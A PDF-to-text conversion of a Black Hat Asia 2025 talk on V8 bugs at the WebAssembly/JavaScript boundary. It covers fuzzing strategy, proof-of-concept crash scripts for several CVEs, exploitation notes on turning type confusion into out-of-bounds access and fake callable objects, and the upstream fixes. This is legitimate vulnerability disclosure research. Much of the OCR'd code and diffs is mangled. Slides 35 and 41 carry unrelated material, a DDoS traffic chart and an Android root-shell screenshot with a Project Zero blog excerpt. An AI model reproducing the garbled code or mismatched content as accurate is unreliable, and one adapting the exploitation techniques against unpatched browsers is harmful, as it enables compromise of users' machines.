---
title: "Bridging the Gap Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8"
speakers: ["Nan Wang", "Zhenghang Xiao", "Xuehao Guo", "Ming Hu"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2025"
edition: "ASIA"
year: 2025
source_pdf: "Black Hat Asia 2025 Slides/Nan Wang & Zhenghang Xiao & Xuehao Guo& Ming Hu_Bridging the Gap Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8.pdf"
pages: 44
sha256: "414e544f1beb9b7b035624edca7a8b4f95f3b43f080e369f8b78b0f6ad0cbbac"
text_chars: 24605
ocr_pages: 16
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.4
ocr_unreliable_blocks: 2
vision_verified_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T03:55:52Z"
---
# Bridging the Gap Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8

**Speakers:** Nan Wang, Zhenghang Xiao, Xuehao Guo, Ming Hu  
**Conference:** Black Hat ASIA 2025  
**Source:** `Black Hat Asia 2025 Slides/Nan Wang & Zhenghang Xiao & Xuehao Guo& Ming Hu_Bridging the Gap Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8.pdf` (44 pages)


## Slide 1

## Bridging the Gap: Type Confusion and Boundary Vulnerabilities Between WebAssembly and JavaScript in V8

Nan Wang, Zhenghang Xiao

#BHAS   @BlackHatEvents

## Slide 2

## About us

**Nan Wang @eternalsakura13**

**Zhenghang Xiao @Kipreyyy**

- Security researcher focusing on browser vulnerability research.

- Chrome VRP Top 3 Researcher in 2022/2023/2024

- Facebook Top 2 Whitehat Hacker in 2023

- MSRC Ranked 6th in Q3 2024

   - Individual security researcher

   - Second-year Master's candidate at NISL Lab, Tsinghua University

   - Focusing on browser security and fuzzing

   - Chrome VRP top researcher in 2023&2024

- Speaker of BlackHat USA 2023 / BlackHat Asia 2023 / ZeroCon 2024 / BlackHat USA 2024

- Credited by Facebook, Google, etc.

- Speaker of BlackHat USA 2023 & 2024 / ZeroCon 2024

#BHAS   @BlackHatEvents

## Slide 3

**ABOUT SERES: An Innovative Network Security Company Focusing On Offensive & Defensive Security Applications**

Offensive Security Technique Attack Behavior Modeling

Multi-source Big Data Intelligence

Cyber Security LLM…

**Providing One-stop Cyber Security Solutions For Government & Enterprise Clients.**

Realistic Cyber Drills Threat Vulnerability Intelligence

Crowdsourced Security Testing

Security Risk Assessment…

#BHAS   @BlackHatEvents

## Slide 4

## Agenda

#### **1. Introduction**

**2. Type Confusion between WasmObject and JSObject 3. UAF in V8 WasmInternalFunction GC**

**4. Type Confusion in WebAssembly JSPI Wrapping 5. Conclusion**

#BHAS   @BlackHatEvents

## Slide 5

||Issue|First Exploited|Description|JavaScript or
WebAssembly|368241697|V8CTF|Type confusion
due to improper
|Both|
|---|---|---|---|---|---|---|---|---|
|Introduction|330588502|Pwn2Own|Incorrect parsing of Wasm
Types|WebAssembly|||WASM module
size check in
AsyncStreamingD
||
||323694592|V8CTF|Signature mismatch in|WebAssembly|||ecoder||
|**WASM-exploitable Bugs**|||specialized wasm-to-js
wrappers||371565065|V8CTF|Arbitrary WASM
type confusion due
|WebAssembl
y|
||339458194|ITW|Wrong handling of Wasm
Structs in JavaScript
runtime|Both|||to module
confusion in
wasm-to-js tier-up||
|**New WASM Proposals**|339736513|V8CTF|Wrong handling of Wasm
Structs in JavaScript
runtime|Both|372269618|V8CTF|Type confusion
due to
DefaultReference
Value()|WebAssembl
y|
||346197738|V8CTF|Missing type
canonicalization for wasm
exceptions JS API|WebAssembly|||`undefined` default
value for
kNoExtern||
||360533914|V8CTF|Arbitrary WASM type
confusion due to
incomplete fix of CVE-
2024-6100|WebAssembly|378779897|V8CTF|Register overwrite
caused by
GetMemOp
reusing
kScratchRegister|WebAssembl
y|
||360700873|ITW|Missing Loop Input
|WebAssembly|||
in WASM Liftoff||
||||Spilling in Wasm Causing
Redundant Register
Reload||379009132|V8CTF|Relative Type
Indexes in
Canonical Types|WebAssembl
y|
||365802567|V8CTF|WASM type confusion
due to imported tag
|WebAssembly|||
Cause WASM
Type Confusion||
||||signature subtyping||383356864|V8CTF|Single-block Loop
Phi Input Error in
WasmGCTypeAna
lyzer|WebAssembl
y|
||||||391907159|V8CTF|#BHAS   @Black
Dead Code
Tracking Bug in
Wasm|HatEvents
WebAssembl
y|

## Slide 6

## Research Focus: WASM & JS Boundary

- **Two Runtimes**

   - **Wasm Runtime**

   - **JavaScript Runtime**

- **Bridging Layer: “Wrappers”**

   - **JS-to-Wasm / Wasm-to-JS**

   - **Handles Import/Export, Exceptions, and Memory/GC across language boundaries**

- **Why Focus Here?**

   - **New Proposals (WASM GC, Exceptions, JSPI, etc.) raise complexity**

   - **High-Risk Bugs**

#BHAS   @BlackHatEvents

## Slide 7

## Recap JS Fuzzer

#### **Analysis guided mutaion**

- **Type Analysis**

- **Scope Analysis**

- **Context Analysis**

#BHAS   @BlackHatEvents

## Slide 8

# Type Confusion between WasmObject and JSObject

###### CVE-2024-5158 CVE-2024-7550

#BHAS   @BlackHatEvents

## Slide 9

## WASM GC proposal

- **Object-based reference types (struct, array)**

- **externref, eqref, funcref for richer references**

- **Automatic garbage collection**

- **Subtyping support for advanced type usage**

#BHAS   @BlackHatEvents

## Slide 10

### How to modify the Fuzzer to find bugs?

Boom!

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Export WASM Struct to JS
ler.addFunction('makeStruct', ...)
ortFunc (
let instance = 1 der.instantiate ();
return instanc
xports.makeStruct ();
Mutation
Mutated Attack Code
function createWasmStruct() {
1
ModuleBuilder ();
builder =
builder.addFunction('makeStruct', ...)
rtFunc ()
let instance = builder.instantiate();
n instance.exports.makeStruct ();
let wasmoObj] = createWasmStruct ();
print ([1].concat ());7
Key Mutation Points:
- Replace JS object with WASM struct
- Pollute Array prototype chain
- Triggers concat() method
Boom!
$ /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc.js
#
# Fatal error in gen/torque-generated/src/objects/js-objects-tq-inl. inc, line 67
# Check failed: !v8::internal::v8_flags.enable_slow_asserts.value() || (IsJSObject_NonInline(*this)).
#
#
#FailureMessage Object: 0x7ffd386eceed
/tmp/d8-Linux-debug-v8-component-93712/libv8_libplatform.so(+0x18e0d) [0x7ff684218e0d]
/tmp/d8-Linux-debug-v8-component-93712/libv8_libbase.so(V8_Fatal(char const, int, char const«,
/tmp/d8-Linux-debug-v8-component-93712/libv8.so(+0x2660ffc) [0x7ff681460f fc]
/tmp/d8-Linux-debug-v8-component-93712/libv8.s0(+0x26589d3) [0x7ff6814589d3]
[1] 1575121 trace trap /tmp/d8-linux-debug-v8-component-93712/d8 /tmp/poc2. js
```

## Slide 11

# CVE-2024-5158

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE-2024-5158
JavaScript Code
Array. protatype-<-"“proto = wa
V8 Engine Internal Implementation
Maybe<bool>JSReceiver::SetPrototype (Isolate* isolate,
Handle<JSReceiver> object,
_-value , bool from_javascr
__ShoutdThrow should_throw) {
if (IsWasmObject (*object)) {
RETURN_FAILURE(isolate, should_throw,
NewTypeError (MessageTemplate: : kWasmObjectsA
v
\
if, (IsdSProxy(*object)) {
keturn
JSProxy::SetPrototype (isolate, Handle<Js
réturn JSObject::SetPrototype (isolate, Handle<J
Lot
ro:
```

## Slide 12

# CVE-2024-5158

##### Key Flow

- Array.prototype.__proto__ = wasmOb j

- Slow_ArrayConcat → IterateElements

- _HasOnlySimpleElements_ does _iter.GetCurrent<JSObject>()_

- Incorrectly treated as a JSObject

#BHAS   @BlackHatEvents

## Slide 13

# Fix Patch

**Check JSObject explicitly, not just avoid Proxy.**

**Resolves WasmObject→JSObject confusion in prototype chain.**

#BHAS   @BlackHatEvents

## Slide 14

# CVE-2024-7550

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
JavaScript instanceof Operation
new arg() instanceof arg
CV E -2 o2 4.7 5 5 O Triggers JIT optimization after 5000 iterations
TryBuildFastinstanceOf
Maglev compiler attempts to optimize the operation
Key Exploit I
ars prototype = struct
: : Type Confusion
is set to a wasm struct Maglev compiler assumes
instead of an object Checks if prototype exists in the object's chain prototype is always
a JSObject but
encounters a
ie CRASH!
InferHasInPrototypeChain
last_prototype = prototype. AsJSOb ject () ;
```

## Slide 15

# Fix Patch

**Added a JSObject check for the prototype map. Resolves WasmObject→JSObject confusion in prototype chain.**

#BHAS   @BlackHatEvents

## Slide 16

# issue-339736513 [v8ctf M125]

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
issue-339736513 [v8ctf M125]
function set_keyed_prop(arr, key, val) { MaybeHandle<Object> StoreIC::Store(Handle<Object> object,
arr[key] = val; Handle<Name> name,
} Handle<Object> value,
StoreOrigin store_origin) {
function pwn() { [ sed
set_keyed_prop([], ®, @x1337); if (use_ic) {
} UpdateCaches(&it, value, store_origin); //-------- >[@]
let wasm_array = wasm.create_array(Q); } else if (state() == NO FEEDBACK) {
set_keyed_prop(wasm_array, "foo", @x1337);
} catch(err){ } a
if (IsAnyDefineOwn()) {
[...]
} MAYBE_RETURN_NULL(Object::SetProperty(&it, value, store_origin)); //-------- >[1]
pwn(); }
return value;
```

## Slide 17

# issue-339736513 [v8ctf M125]

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
issue-339736513 [v8ctf M125]
function set_keyed_prop(arr, key, val) f
arr[key] = val;
}
function pwn() {
set_keyed_prop([], ®, @x1337);
let wasm_array = wasm.create_array(@);
try {
set_keyed_prop(wasm_array, "foo", @x1337);
} catch(err){ }
set_keyed_prop([], ®, @x1337);
}
pwn();
Phase 1: Training IC with Normal Arrays
set_keyed_prop([], 0, 0x1337); // Called multiple times
IC initially in UNINITIALIZED state, collecting feedback
Phase 2: Vulnerability Trigger
try { set_keyed_prop(wasm_array, "foo", 0x1337); } catch(err) { }
slot #0 StoreKeyedSloppy MONOMORPHIC with name <String[3]: #foo>
[weak] <Map (WASM_ARRAY TYPE) >: StoreHandler (Smi) (kind = kSlow...)
UpdateCaches runs before WasmObjectsAreOpaque exception
DebugPrint: @x378800298c55: [Function] in OldSpace
- slot #@ StoreKeyedSloppy POLYMORPHIC
[weak] @x3788002ae749 <Map(WASM_ARRAY_TYPE)>:
StoreHandler(builtin = StoreFastElementIC_NoTransitionGrowAndHandleCow)
[weak] @x37880028c299 <Map[16](PACKED_SMI_ELEMENTS)>:
StoreHandler(builtin = StoreFastElementIC_NoTransitionGrowAndHandleCow)
Phase 3: Polymorphic IC Creation
set_keyed prop([], 0, 0x1337); // Normal array after WasmArray attempt
slot #0 StoreKeyedSloppy POLYMORPHIC
[weak] <Map(WASM ARRAY TYPE)>: StoreHandler (builtin = StoreFastElementIC_NoTransition...)
IC becomes POLYMORPHIC with both WasmArray and normal array handlers
Phase 4: Type Confusion Exploit
set_keyed prop(wasm_array, 0, 0x1337); // Triggers vulnerability
WasmArray incorrectly uses JSObject's fast handler from polymorphic IC
V8 blindly applies StoreFastElementIC handler to WasmArray object
Results in type confusion vulnerability and potential memory corruption
```

## Slide 18

# Exploit

**The memory layout of WasmArray** ：

**Modifying the length to a FixedArray address expanded access boundaries.**

#BHAS   @BlackHatEvents

## Slide 19

# Fix Patch

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Fix Patch
[ic] Use slow stub element handler for non-JSObjects
Fixed: 339736513
Change-Id: 1134a046475b0b004c3delbacc5b2f1a7fa503d96
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Commit-Queue: Igor Sheludko <ishell@chromium.org>
Auto-Submit: Shu-yu Guo <syg@chromium.org>
Cr-Commit-Position: refs/heads/main@{#93847}
diff --git a/src/ic/ic.ce b/src/ic/ic.cc
index 8a2ca54..0661209 100644
--- a/src/ic/ic.cc
@@ -2388,15 +2388,16 @@
isolate()),
IsStoreInArrayLiteralIC());
if (IsJSProxyMap(*receiver_map)) {
+ if (!IsISObjectMap(*receiver_map)) {
// DefineKeyedOwnIC, which is used to define computed fields in instances,
= // should be handled by the slow stub.
= if (IsDefineKeyedOwnIC()) {
= TRACE_HANDLER_STATS(isolate(), KeyedStoreIC_SlowStub) ;
~ return StoreHandler: :StoreSlow(isolate(), store_mode) ;
zt // should handled by the slow stub below instead of the proxy stub.
+ if (IsJSProxyMap(*receiver_map) && !IsDefineKeyedOwnIC()) {
+ return StoreHandler: :StoreProxy(isolate()) 5
= return StoreHandler: :StoreProxy(isolate());
+ // Wasm objects or other kind of special objects go through the slow stub.
te TRACE_HANDLER_STATS(isolate(), KeyedStoreIC_SlowStub) ;
+ return StoreHandler: :StoreSlow(isolate(), store_mode) ;
```

## Slide 20

# UAF in V8 WasmInternalFunction GC

###### CVE-2024-3156

#BHAS   @BlackHatEvents

## Slide 21

### How to modify the Fuzzer to find bugs?

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
// Creates a WASM module importing a JS function (i32 -> i32)
function createPocWasmModule() {
let b = new WasmModuleBuilder();
let sig = b.addType(makeSig([kWasmI32], [kWasmI32]));
// Declare import 'func' in '‘'js'
b.addImport('js','func',sig);
// Expose callImported(x) -> calls the imported function
b.addFunction('callImported',sig)
.addBody([kExprLocalGet, @, kExprCallFunction, @])
// Provide a JS function that triggers gc(), potentially exposing UAF if references aren't tracked
return b.instantiate({
func:new WebAssembly.Function({parameters:['i32'], results:['i32']},x=>{gce();return x+1;})
}
}
let inst=createPocWasmModule();
for(let i=0;i<10000;i++){ inst.exports.callImported(i); }
```

## Slide 22

### How to modify the Fuzzer to find bugs?

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
// Creates a WASM module importing a JS function (i32 -> i32)
function createPocWasmModule() { WebAssembly JS Import - Fuzzing Components
let b = new WasmModuleBuilder () ;
let sig = b. addType (makeSig([kWasmI32], [kWasmI32])) ;
Declare import ‘func’ in ’ js’ Wasm Import Declaration
Oc addImport( ’ js’, ’ func’, sig);
=
Ree 4 Declaring an import 'func' from ‘js' namespace
Expose callImported(x) —> calls the imported function : ‘ ; 3
a - : = = a Equivalent to: (import "js" "func" (func $funcSig))
b. addFunction( °callImported’ , sig)
. addBody ([kExprLocalGet, 0, kExprCallFunction, 0])
isesaininee JS Export Function
Provide a JS function that triggers gc(), potentially exposing UAF if references ... Defining and exporting ‘calllmported' function
return b. instantiate({ This allows Wasm to call the imported JS function
js: {
func : new WebAssembly. Function({ parameters :[ ’ i32’], results:[ ’i32’]}, x=>{gc(Q);
} Instance Creation with Import Object
jE Providing the actual JS function implementation
} The function calls gc() which could expose UAF
let inst=createPocWasmModule() ; Equivalent to: {js: {func: someFunction}}
for (let i= 0;i< 10000 ;i++) { inst. exports. callImported(i); }
Fuzzing Impact:
For fuzzing tests, we need to randomly insert import
declarations in Wasm, provide JS functions that trigger
garbage collection, and create instances with these
imports to potentially expose Use-After-Free bugs.
```

## Slide 23

# CVE-2024-3156

- **Import a JS function into Wasm**

   - **Declared as a global import of type** **_kWasmAnyFunc_**

   - **JS function is wrapped by** **_WebAssembly.Function_**

   - **Internally stored in a WasmInternalFunction, holding a code pointer**

- **Tier up Optimization**

   - **Optimization triggers (e.g., --jit-fuzzing)**

   - **code pointer in WasmInternalFunction switches to optimized version**

- **GC Trigger**

   - **WasmInternalFunction.code is not marked or updated**

#BHAS   @BlackHatEvents

## Slide 24

# Fix Patch

**Explicitly invokes IterateCodePointer in the object descriptor to track kCodeOffset as a strong reference.**

#BHAS   @BlackHatEvents

## Slide 25

# Type Confusion in WebAssembly JSPI Wrapping

###### CVE-2024-5838 CVE-2024-8638

#BHAS   @BlackHatEvents

## Slide 26

### What is JavaScript Promise Integration API?

**Consider following scenario:**

**A WebAssembly module calls a JavaScript function that performs an asynchronous operation (e.g., fetch). This function returns a Promise. However, WebAssembly execution is synchronous, so handling the returned Promise within Wasm becomes a challenge.**

#BHAS   @BlackHatEvents

## Slide 27

### What is JavaScript Promise Integration API?

**A proposal allows WebAssembly applications that were written assuming synchronous access to external functionality to operate smoothly in an environment where the functionality is actually asynchronous.**

#BHAS   @BlackHatEvents

## Slide 28

# WASM JSPI

- **WebAssembly.Suspending Allows Wasm code to call asynchronous JavaScript functions and suspend execution until the Promise resolves.**

- **WebAssembly.Promising Enables Wasm functions to return a Promise, allowing JavaScript to handle asynchronous Wasm results.**

#BHAS   @BlackHatEvents

## Slide 29

### How to modify the Fuzzer to find bugs?

Boom!

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WebAssembly to JSPI Transformation
Original WebAssembly Code
const wasmArray = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1,
let module = new WebAssembly.Module(wasmArray);
let v2 = new WebAssembly.Instance(module, { m: { js: ()=>{} }});
v2.exports.main();
v Transform to use JSPI
JSPI-Enabled Code
const wasmArray = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1,
let module = new WebAssembly.Module(wasmArray);
let v2 = new WebAssembly.Instance(module, { m: { js: (=> }});
Added code
CT] JSPI transformatior
B& WebAssembly.promising wrapper
Boom!
# CMD: /tmp/d8-Linux-debug—v8-component-94015/d8 —-expose-gc poc.js
Received signal 11 SEGV_ACCERR 2b94beadbef6
==== C stack trace == ==
[0x55c92c207964]
[end of stack trace]
```

## Slide 30

# CVE-2024-5838

V8 internally uses different data structures to represent functions

- imported from JavaScript into the Wasm environment.

- native Wasm functions.

#BHAS   @BlackHatEvents

## Slide 31

# CVE-2024-5838

Is it possible for the function caller to confuse the use of these two structures?

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE-2024-5838
Is it possible for the function caller to confuse
the use of these two structures? Caller
~ V8 Engine
asmApiFunctionRef WasmTrustedinstanceData
Imported JS Function ative Wasm Functio
```

## Slide 32

# CVE-2024-5838

Try _Re-exported_ the _imported_ function?

- => Type confusion!

But how to exploit?

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE-2024-5838
Try Re-exported the imported function?
d8.test.enableJSPI
const wasmArray = new Uint8Array
new WebAssembly.Module(wasmArray
let module =
let v2 = new WebAssembly.Instance(module m: 36: =>
let v3 = WebAssembly.promising(v2.exports.main
v3
=> Type confusion!
But how to exploit?
JSPI Type Confusion Vulnerability
PromisingWasmExportedFunction
WasmPromising Wrapper
1. Set call_target
2. Prepare Parameters
3. Call call_target
WasmApiFunctionRef
Expected
Actual
'
1
1
uiltins_WasmToJSWrapperAs
| Expects WasmApiFunctionRef
```

## Slide 33

# CVE-2024-5838

Analyse internal data structure:

- Some pointer in WasmTrustedInstanceData are PROTECTED.

- The field offset of ` _callable_ ` field and

   - ` _dispatch_table_for_imports_ ` are the same.

#BHAS   @BlackHatEvents

## Slide 34

# CVE-2024-5838

What happend if we confuse these two structures?

=> Fake a callable object.

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Trusted Memory Region
j TrustedBase + 0x11223344
User Controlled
. Fixed Array
What happend if we confuse these two ! oe
structures? Other Callable |
=> Fake a callable object. PPOINTER
WasmTrustedinstanceData WasmApiFunctionRef(Confused)
dispatch_table_for_imports callable (confused)
0x11223344 — 0x11223344
use
Builtins WasmToJsWrapperCSA
```

## Slide 35

# CVE-2024-5838

What happend if we confuse these two structures?

=> Fake a callable object.

#BHAS   @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Heavily Distributed Attack: > 187k IP Addresses

[Line chart]
Y-axis title: Distinct number of IP addresses
Y-axis ticks: 50,000 / 40,000 / 30,000 / 20,000 / 10,000 / 0
X-axis ticks: 2023-02-22 00:00   2023-02-23 00:00   2023-02-24 00:00   2023-02-25 00:00   2023-02-26 00:00   2023-02-27 00:00   2023-02-28 00:00
X-axis label: Number of IP addresses / 3h
```

## Slide 36

# Fix Patch

Restricted some functionalities of the imported function.

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Fix Patch
Restricted some functionalities of the imported
function.
[wasm] Disable js-to-wasm generic wrapper for imports
There are some unresolved issues with tiering-up the wasm-to-js wrapper
when it is called from the generic js-to-wasm wrapper.
Disable the generic js-to-wasm wrapper for imports again until these
issues are resolved.
R=ahaas@chromium.org
Change-Id: Ibf6d11ab759fbbb71da93d163121a28aaa0700e0
Reviewed-by: Andreas Haas <ahaas@chromium.org>
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
Cr-Commit-Position: refs/heads/main@{ #94270}
diff --git a/src/wasm/wasm-objects.cc b/src/wasm/wasm-objects.cc
index d8250cc..28d73e5 100644
--- a/src/wasm/wasm-objects.cc
+++ b/src/wasm/wasm-objects.cc
@@ -1512,7 +1512,8 @@
if (entry.IsStrongOrWeak() && IsCodeWrapper(entry.GetHeapObject())) {
wrapper_code = handle(
CodeWrapper: :cast(entry.GetHeapObject())->code(isolate), isolate) ;
} else if (CanUseGenericJsToWasmWrapper(module, function.sig)) {
lse if (!function.imported &&
m
on.sig))
Car cJsToV Wrapper(module, fur g
wrapper_code = isolate->builtins()->code_handle(Builtin: :kJSToWasmWrapper) ;
} else {
// The wrapper may not exist yet if no function in the exports section has
```

## Slide 37

# CVE-2024-8638

##### Let's talk about **_*To*Wrapper_** !

- WasmToJSWrapper

- JSToWasmWrapper

- JSToJSWrapper

To simplify representation, some structural relationships may differ from the actual code.

#BHAS   @BlackHatEvents

## Slide 38

# CVE-2024-8638

**V8 would optimizes the JSToWasmWrapper to reduce the overhead of parameter type conversion.**

**Newly optimized wrapper is then applied to all exported functions with same functio signature.**

#BHAS   @BlackHatEvents

## Slide 39

# CVE-2024-8638

What about the function wrapper for re-exporting the imported JS function?

##### => JSToJSWrapper

#BHAS   @BlackHatEvents

## Slide 40

# CVE-2024-8638

What happens if the wrapper of another Wasm exported function is optimized at this point?

=> The JSToJSWrapper will be incorrectly replaced.

Crashed

#BHAS   @BlackHatEvents

## Slide 41

# CVE-2024-8638

#BHAS   @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Fix

[Left: social media post]
Thomas King - @thomasking2014@i...   @Thom... · 2022年9月20日
R.I.P again

[Screenshot 1: Android About phone]
Android version
13

Android security update
September 5, 2022

Google Play system update
July 1, 2022

Baseband version
g5123b-102852-220720-B-8851166

Kernel version
5.10.107-android13-4-00008-g466e95df8c7c-ab8760753
#1 Thu Jun 23 15:42:45 UTC 2022

Build number

[Screenshot 2: terminal]
spawn root shell !
pwned_by_thomasking:/data/data/org.connectbot # id
uid=0(root) gid=0(root) groups=0(root),3003(inet),9997(everybody),2
0246(u0_a246_cache),50246(all_a246) context=u:r:untrusted_app_27:s0
:c246,c256,c512,c768
pwned_by_thomasking:/data/data/org.connectbot # getenforce
Permissive
pwned_by_thomasking:/data/data/org.connectbot #

[Right: blog post]
Tuesday, November 22, 2022

Mind the Gap

By Ian Beer, Project Zero

Note: The vulnerabilities discussed in this blog post (CVE-2022-33917) are fixed by the upstream vendor, but at the time of publication, these fixes have not yet made it downstream to affected Android devices (including Pixel, Samsung, Xiaomi, Oppo and others). Devices with a Mali GPU are currently vulnerable.

Introduction

In June 2022, Project Zero researcher Maddie Stone gave a talk at FirstCon22 titled 0-day In-the-Wild Exploitation in 2022…so far. A key takeaway was that approximately 50% of the observed 0-days in the first half of 2022 were variants of previously patched vulnerabilities. This finding is consistent with our understanding of attacker behavior: attackers will take the path of least resistance, and as long as vendors don't consistently perform thorough root-cause analysis when fixing security vulnerabilities, it will continue to be worth investing time in trying to revive known vulnerabilities before looking for novel ones.

The presentation discussed an in the wild exploit targeting the Pixel 6 and leveraging CVE-2021-39793, a vulnerability in the ARM Mali GPU driver used by a large number of other Android devices. ARM's advisory described the vulnerability as:

Title           Mali GPU Kernel Driver may elevate CPU RO pages to writable
CVE             CVE-2022-22706 (also reported in CVE-2021-39793)
Date of issue   6th January 2022
Impact          A non-privileged user can get a write access to read-only memory pages [sic].

The week before FirstCon22, Maddie gave an internal preview of her talk. Inspired by the description of an in-the-wild vulnerability in low-level memory management code, fellow Project Zero researcher Jann Horn started auditing the ARM Mali GPU driver. Over the next three weeks, Jann found five more exploitable vulnerabilities (2325, 2327, 2331, 2333, 2334).
```

## Slide 42

# Fix Patch

In replacing the wrapper of a function exported from Wasm, do not replace the wrapper if the function is imported from the JavaScript side.

#BHAS   @BlackHatEvents

## Slide 43

### WASM-JS Interaction Fuzzing Architecture

#BHAS   @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
WASM-JS Interaction Fuzzing
Architecture
WebAssembly-JavaScript Interaction Fuzzing Architecture
WASM.-JS Interaction Mutation Strategies
WASM Export to JS JS Import to WASM JSPI Transformation
Export WASM Objects & Create WASM Modules with Use WebAssembly.promising
Functions to JS Layer Imported JS Functions & WebAssembly.Suspending
Replace JS native objects import "js" "func" (fune $funcSig) d8.test.enableJSPI();
with exported WasmObjects JS: {js: {func: someFunction}} v3 = WebAssembly.promising(v2);
Trigger Type Confusion Test Cross-Language Find Bugs in Async
& Memory Safety Issues Function Calls & GC WASM-JS Interactions
Boom! Boom! Boom!
\ J
Mutation Engine
Generate semantically valid mutations
Analysis Layer
Type Analysis | Scope Analysis | Cross-Language Analysis |
Legend
Potential Bug Discovery
```

## Slide 44

# Conclusions

**1. The Boundary Between WASM and JS Remains a High-Risk Area**

**2. JSPI Improves Asynchronous Integration but Poses Security Risks**

**3. Fuzz Testing is Crucial for Discovering Vulnerabilities**

**4. Engine-Level Improvements and Patches Are Ongoing**

#BHAS   @BlackHatEvents
